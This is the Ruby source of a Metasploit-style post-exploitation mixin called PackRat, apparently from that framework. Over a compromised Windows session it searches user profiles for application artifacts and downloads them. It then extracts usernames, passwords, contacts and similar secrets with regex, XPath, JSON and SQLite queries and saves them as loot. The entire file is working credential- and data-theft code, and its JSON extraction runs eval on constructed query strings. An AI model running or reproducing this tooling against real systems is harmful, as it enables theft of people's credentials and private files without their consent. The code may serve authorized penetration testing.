# -*- coding: binary -*-
#
# A mixin used for providing Modules with post-exploitation options and helper methods

# PackRat is a post-exploitation module that gathers file and information artifacts from end users' systems.
# PackRat searches for and downloads files of interest (such as config files, and received and deleted emails) and extracts information (such as contacts and usernames and passwords), using regexp, JSON, XML, and SQLite queries.
# This is a mixin that will be included in each separated moduel. Further details can be found in the module documentation.
#
require 'sqlite3'
module Msf
  class Post
    module Windows
      module Packrat

        include Msf::Post::File
        include Msf::Post::Windows::UserProfiles
		  
        # Check to see if the application base folder exists on the remote system.
        def parent_folder_available?(path, dir, application)
          parent_folder = dir.split('\\').first
          dirs = session.fs.dir.foreach(path).collect				
			
          return dirs.include? parent_folder 
        end
		  
		def artifact_folder_available?(path, dir, application, artifact_child)
			parent_folder_path = "#{path}#{session.fs.file.separator}#{dir}"
			return directory?(parent_folder_path)
		end

        def find_files(userprofile, application, artifact, path, dir)
          file_directory = "#{path}\\#{dir}"
          files = session.fs.file.search(file_directory, artifact.to_s, true)

          # Checks if the file was found in the application's bas file
          if files.empty?
            vprint_error("#{application.capitalize}'s #{artifact.capitalize} not found in #{userprofile['UserName']}'s user directory\n")
          else
            print_status("#{application.capitalize}'s #{artifact.capitalize} file found")
          end
          return files
        end

        def extract_xml(saving_path, artifact_child, artifact, local_loc)
          xml_file = Nokogiri::XML(::File.read(saving_path.to_s))
          credential_array = []
          xml_credential = ''

          artifact_child[:xml_search].each do |xml_split|
            xml_split[:xml].each do |xml_string|
              xml_file.xpath(xml_string.to_s).each do |xml_match|
                vprint_status(xml_split[:extraction_description].to_s)
                print_good xml_match.to_s
                credential_array << xml_match.to_s
              end
            end
          end

          credential_array.each do |xml_write|
            file_save = xml_write.chomp + "\n"
            xml_credential << file_save.to_s
          end
          xml_loot = store_loot("EXTRACTIONS#{artifact}", '', session, xml_credential.to_s, local_loc)
          print_good "File with data saved:  #{xml_loot}"
        rescue StandardError => e
          print_status e.to_s
        end

        def extract_regex(saving_path, artifact_child, artifact, local_loc)

          file_string = ''
          ::File.open(saving_path.to_s, 'rb').each do |file_content|
            file_string << file_content.to_s
          end

          credential_array = []
          cred_save = ''
          user_regex = datastore['REGEX']
          regex_string = user_regex.to_s

          artifact_child[:regex_search].each do |reg_child|
            reg_child[:regex].map { |r| Regexp.new(r) }.each do |regex_to_match|
              if file_string =~ regex_to_match
                file_string.scan(regex_to_match).each do |found_credential|
                  file_strip = found_credential.gsub(/\s+/, '').to_s
                  vprint_status(reg_child[:extraction_description].to_s)
                  print_good file_strip
                  credential_array << file_strip
                end
              end
            end
          end

          if file_string =~ user_regex
            file_string.scan(user_regex).each do |user_match|
              user_strip = user_match.gsub(/\s+/, '').to_s
              vprint_status "Searching for #{regex_string}"
              print_good user_strip.to_s
              credential_array << user_strip
            end
          end

          credential_array.each do |file_write|
            file_save = file_write.chomp + "\n"
            cred_save << file_save.to_s
          end
          regex_loot = store_loot("EXTRACTION#{artifact}", '', session, cred_save.to_s, local_loc)
          print_good "File with data saved:  #{regex_loot}"
        rescue StandardError => e
          print_status e.to_s
        end

        def extract_sqlite(saving_path, artifact_child, artifact, local_loc)
          database_string = ''
          database_file = ::SQLite3::Database.open(saving_path.to_s)
          artifact_child[:sql_search].each do |sql_child|
            db = database_file.prepare "SELECT #{sql_child[:sql_column]} FROM #{sql_child[:sql_table]}"
            db_command = db.execute
            db_command.each do |database_row|
              join_info = database_row.join "\s"
              line_split = join_info.chomp + "\n"
              database_string << line_split.to_s
            end
          end

          sql_loot = store_loot("EXTRACTIONS#{artifact}", '', session, database_string.to_s, local_loc)
          print_good "File with data saved:  #{sql_loot}"
        rescue StandardError => e
          print_status e.to_s
        end

        def extract_json(saving_path, artifact_child, artifact, local_loc)
          json_file = ::File.read(saving_path.to_s)
          json_parse = JSON.parse(json_file)
          parent_json_query = ''
          child_json_query = []
          json_credential_save = []
          json_cred = ''

          artifact_child[:json_search].each do |json_split|
            parent_json_query << json_split[:json_parent]
            json_split[:json_children].each do |json_child|
              child_json_query << json_child.to_s
            end
          end

          child_json_query.each do |split|
            children = eval("json_parse#{parent_json_query}")
            children.each do |child_node|
              child = eval("child_node#{split}").to_s
              json_credential_save << "#{split}:  #{child}"
            end
          end

          json_credential_save.each do |json_save|
            file_save = json_save.chomp + "\n"
            print_good file_save.to_s
            json_cred << file_save.to_s
          end
          json_loot = store_loot("EXTRACTIONS#{artifact}", '', session, json_cred.to_s, local_loc)
          print_good "File with data saved:  #{json_loot}"
        rescue StandardError => e
          print_status e.to_s
        end

        # Download file from the remote system, if it exists.
        def packrat_download_file(saving_path, file_to_download, file, application)
          print_status("Downloading #{file_to_download}")
          session.fs.file.download_file(saving_path, file_to_download)
          print_status("#{application.capitalize} #{file['name'].capitalize} downloaded")
          print_good("File saved to:  #{saving_path}\n")
        end

        def run_packrat(userprofile, opts = {})
          vprint_status 'Starting Packrat...'
          artifact_parent = opts[:gatherable_artifacts]
          application = opts[:application]

          artifact_parent.each do |artifact_child|
            file_type = artifact_child[:filetypes]
            artifact = artifact_child[:artifact_file_name]
            dir = artifact_child[:dir]
            path = userprofile[artifact_child[:path]]
            credential_type = artifact_child[:credential_type]

            # Checks if the current artifact matches the search criteria
            if (file_type != datastore['ARTIFACTS'] && datastore['ARTIFACTS'] != 'All')
              # Doesn't match search criteria, skip this artifact
              vprint_status "Skipping #{file_type} due to unmatched artifact type"
              next
            end

            # Check if the applications's base folder exists in user's directory on the remote computer.
            if parent_folder_available?(path, dir, application)
              vprint_status("#{application.capitalize}'s base folder found")
            else
              vprint_error("#{application.capitalize}'s base folder not found in #{userprofile['UserName']}'s user directory\n")
              # skip non-existing file
                next
            end
			  
			#Check the availability of the folder containing the artifact of interest.
			if artifact_folder_available?(path, dir, application, artifact_child)
				vprint_status("Found the folder containing specified artifact for #{artifact}.")
			else
				vprint_error("Could not find the folder for the specified artifact #{artifact} at #{dir}.\n")
				# skip non-existing file
                next
			end
			 
 

            # Get the files that matches the pre-defined artifact name
            found_files = find_files(userprofile, application, artifact, path, dir)

            # Checks if the user have disabled STORE_LOOT option or if no file was found. Go to next in such case
            if found_files.empty?
              vprint_error "Skipping #{artifact} since it was not found on the user's folder."
              next
            elsif !datastore['STORE_LOOT']
              print_good 'File was found but STORE_LOOT option is disabled. File was not saved'
              next
            end

            # Download each files found
            found_files.each do |file|

              vprint_status "Processing #{file['path']}"

              file_split = file['path'].split('\\')
              local_loc = "#{file_split.last}#{file['name']}"
              saving_path = store_loot("#{application}#{file['name']}", '', session, file['name'], local_loc)
              file_to_download = "#{file['path']}#{session.fs.file.separator}#{file['name']}"

              # Download file
              packrat_download_file(saving_path, file_to_download, file, application)
              if datastore['EXTRACT_DATA']
                case credential_type
                when 'xml'
                  extract_xml(saving_path, artifact_child, artifact, local_loc)
                when 'json'
                  extract_json(saving_path, artifact_child, artifact, local_loc)
                when 'text'
                  extract_regex(saving_path, artifact_child, artifact, local_loc)
                when 'sqlite'
                  extract_sqlite(saving_path, artifact_child, artifact, local_loc)
                else
                  vprint_error 'This artifact does not support any extraction type'
                end
              else
                vprint_status 'Data are not extracted'
              end
            end
          end
        end
      end
    end
  end
end
